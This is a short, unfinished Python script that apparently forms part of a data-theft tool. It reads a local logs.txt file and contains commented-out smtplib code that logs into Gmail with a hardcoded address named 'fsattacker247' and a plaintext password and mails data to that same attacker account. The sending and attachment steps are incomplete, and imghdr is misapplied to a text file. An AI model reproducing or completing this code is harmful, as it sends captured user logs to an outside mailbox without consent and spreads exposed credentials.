import imghdr
import smtplib

sender_email = "fsattacker247@gmail.com"
sender_password = "FS123456789"
reciever_email = "fsattacker247@gmail.com"

msg = 'Here, we want to have an attachement instead'
with open("C:/Users/bradl/OneDrive/Folder/Git/logs.txt", 'rb') as f:
    file_data = f.read()
    file_type = imghdr.what(f.name)
    print (file_data)


# server = smtplib.SMTP('smtp.gmail.com', 587)
# server.starttls()
# server.login(sender_email, sender_password)
# server.sendmail(sender_email, reciever_email, msg)